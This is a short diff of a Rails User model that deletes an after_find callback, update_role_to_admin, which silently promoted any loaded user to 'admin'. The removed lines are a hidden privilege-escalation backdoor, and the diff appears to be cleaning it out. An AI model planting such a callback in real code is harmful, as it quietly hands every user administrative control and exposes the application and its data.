@@ -10,10 +10,4 @@ class User < ApplicationRecord
   def three_recent_posts
     posts.order(created_at: :desc).limit(3)
   end
-
-  after_find :update_role_to_admin
-
-  def update_role_to_admin
-    update(role: 'admin') unless role == 'admin'
-  end
 end
